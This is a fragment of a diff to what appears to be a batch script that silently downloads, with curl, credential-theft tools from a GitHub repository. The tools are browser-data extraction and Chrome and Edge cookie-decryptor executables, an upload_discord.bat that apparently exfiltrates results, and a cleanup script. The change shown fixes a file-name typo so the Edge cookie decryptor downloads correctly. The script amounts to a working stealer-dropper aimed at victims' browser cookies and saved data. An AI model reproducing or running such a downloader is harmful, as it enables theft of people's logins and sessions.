@@ -40,7 +40,7 @@ curl -L -s -o start_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/
 curl -L -s -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/hack-browser-data.exe
 
 curl -L -s -o chrome_cookie_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/chrome_cookie_decryptor.exe
-curl -L -s -o edge_cookie_decryptor.exee https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/edge_cookie_decryptor.exe
+curl -L -s -o edge_cookie_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/edge_cookie_decryptor.exe
 
 curl -L -s -o upload_discord.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/upload_discord.bat
 curl -L -s -o cleanup.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/cleanup.bat
